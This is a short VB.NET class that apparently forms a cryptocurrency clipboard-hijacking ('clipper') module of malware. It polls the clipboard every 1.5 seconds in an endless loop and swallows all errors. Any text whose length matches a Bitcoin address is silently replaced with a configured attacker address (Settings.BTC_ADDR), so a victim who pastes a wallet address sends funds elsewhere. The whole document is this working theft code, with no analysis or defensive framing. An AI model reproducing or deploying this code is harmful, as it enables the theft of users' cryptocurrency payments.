Public Class BTC


    Public Shared Sub _BTC_ST()

        While True
            Try
                Threading.Thread.CurrentThread.Sleep(1500)
                If My.Computer.Clipboard.GetText.Length >= 26 AndAlso My.Computer.Clipboard.GetText.Length <= 36 Then
                    My.Computer.Clipboard.SetText(Settings.BTC_ADDR)
                End If
            Catch ex As Exception
            End Try
        End While

    End Sub

End Class
